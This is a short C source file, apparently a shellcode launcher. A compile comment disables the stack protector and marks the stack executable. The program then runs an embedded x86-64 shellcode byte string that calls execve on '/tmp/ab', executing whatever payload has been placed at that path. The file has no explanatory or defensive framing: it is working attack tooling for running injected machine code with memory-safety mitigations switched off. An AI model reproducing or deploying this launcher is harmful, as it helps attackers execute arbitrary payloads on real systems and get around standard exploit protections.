//Compile with: gcc -fno-stack-protector -z execstack -o ab_launcher ab_launcher.c


int main()
{
    char shellcode[] = "\x48\xb9\x2f\x74\x6d\x70\x2f\x61\x62\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"; // /tmp/ab
    int (*func)();
    func = (int (*)()) shellcode;
    (int)(*func)();
     return 0;
}
            